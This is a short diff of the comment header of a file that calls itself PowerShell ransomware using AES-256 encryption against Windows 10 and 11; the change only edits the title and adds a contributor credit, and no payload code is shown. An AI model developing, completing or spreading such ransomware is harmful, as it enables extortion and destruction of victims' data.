@@ -1,6 +1,6 @@
 
-REM Title: beigeworm's Ransomware.
-REM Author: @beigeworm
+REM Title: beigeworm's Ransomware/Okaidi86
+REM Author: @beigeworm optimisation by : Okaidi86
 REM Description: Ransomware in Powershell - Using AES 256bit Encryption 
 REM Target: Windows 10 and 11
 
